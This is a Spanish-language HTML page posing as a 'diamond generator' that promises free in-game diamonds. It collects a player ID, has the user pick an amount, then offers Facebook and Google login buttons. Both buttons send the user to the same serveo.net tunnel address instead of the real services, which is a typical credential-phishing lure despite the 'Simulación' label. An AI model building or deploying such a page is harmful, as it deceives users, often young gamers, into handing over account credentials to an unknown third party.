<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generador de Diamantes - Simulación</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: rgb(0, 212, 255);
            background: linear-gradient(90deg, rgba(0,212,255,1) 0%, rgba(0,255,96,1) 100%);
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 500px;
        }

        h1 {
            color: #333;
        }

        .form-container {
            margin-top: 20px;
        }

        /* Casilla de entrada de ID moderna */
        input {
            padding: 12px;
            width: 80%;
            margin-bottom: 20px;
            border: 2px solid #00c4ff;
            border-radius: 25px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: #00a1d8;
            outline: none;
            box-shadow: 0 0 8px rgba(0, 172, 255, 0.7);
        }

        /* Estilo de botones */
        button {
            padding: 10px;
            margin: 10px;
            background-color: #00c4ff;
            border: none;
            color: white;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #00a1d8;
        }

        .progress-container {
            width: 100%;
            height: 5px;
            background-color: #ccc;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, rgba(0,212,255,1) 0%, rgba(0,255,96,1) 100%);
        }

        .diamond-options {
            margin-top: 20px;
        }

        .diamond-option {
            padding: 12px;
            margin: 5px;
            background-color: #ff9800;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .diamond-option:hover {
            background-color: #e68900;
        }

        .diamond-logo {
            font-size: 20px;
        }

        .login-section {
            margin-top: 30px;
        }

        .login-section button {
            background-color: #4267B2;
        }

        #login-google {
            background-color: #DB4437;
        }

        /* Estilo para el mensaje de error */
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Generador de Diamantes - Simulación</h1>
        <div class="form-container">
            <label for="user-id">Coloca tu ID:</label>
            <input type="text" id="user-id" placeholder="Ingresa tu ID aquí" inputmode="numeric" maxlength="10" />
            
            <!-- Mensaje de error, inicialmente oculto -->
            <div id="error-message" class="error-message" style="display: none;">
                El ID debe tener al menos 10 dígitos.
            </div>

            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>

            <button id="submit-id">Enviar ID</button>

            <div id="diamond-options" class="diamond-options" style="display: none;">
                <h2>¿Cuántos diamantes quieres?</h2>
                <button class="diamond-option" data-diamonds="100">
                    <span class="diamond-logo">💎</span> 100 Diamantes
                </button>
                <button class="diamond-option" data-diamonds="310">
                    <span class="diamond-logo">💎</span> 310 Diamantes
                </button>
                <button class="diamond-option" data-diamonds="520">
                    <span class="diamond-logo">💎</span> 520 Diamantes
                </button>
                <button class="diamond-option" data-diamonds="1080">
                    <span class="diamond-logo">💎</span> 1080 Diamantes
                </button>
            </div>

            <div id="login-section" class="login-section" style="display: none;">
                <h2>Inicia sesión para continuar</h2>
                <button id="login-facebook">Iniciar sesión con Facebook</button>
                <button id="login-google">Iniciar sesión con Google</button>
            </div>
        </div>
    </div>

    <script>
        // Restringir la entrada solo a números
        document.getElementById('user-id').addEventListener('input', function(event) {
            const value = event.target.value;
            // Elimina cualquier carácter que no sea un número
            event.target.value = value.replace(/[^0-9]/g, '');
        });

        // Manejo del envío del ID
        document.getElementById('submit-id').addEventListener('click', function() {
            const userId = document.getElementById('user-id').value;
            
            // Validación de longitud del ID
            if (userId.length < 10) {
                // Mostrar mensaje de error si el ID es menor a 10 caracteres
                document.getElementById('error-message').style.display = 'block';
                return;  // Detener la ejecución si el ID no es válido
            }

            // Ocultar mensaje de error si el ID es válido
            document.getElementById('error-message').style.display = 'none';

            // Si el ID es válido, muestra la barra de progreso
            document.querySelector('.progress-bar').style.width = '100%';
            setTimeout(() => {
                document.getElementById('diamond-options').style.display = 'block';
            }, 1000);
        });

        // Manejo de selección de diamantes
        const diamondOptions = document.querySelectorAll('.diamond-option');
        diamondOptions.forEach(option => {
            option.addEventListener('click', function() {
                const diamonds = option.getAttribute('data-diamonds');
                alert(`Seleccionaste ${diamonds} Diamantes`);
                document.getElementById('diamond-options').style.display = 'none';
                document.getElementById('login-section').style.display = 'block';
            });
        });

        // Redirección a enlaces de inicio de sesión
        document.getElementById('login-facebook').addEventListener('click', function() {
            window.location.href = 'https://cc96df6f757aa456228c7fd49f7a3787.serveo.net';
        });

        document.getElementById('login-google').addEventListener('click', function() {
            window.location.href = 'https://cc96df6f757aa456228c7fd49f7a3787.serveo.net';
        });
    </script>

</body>
</html>
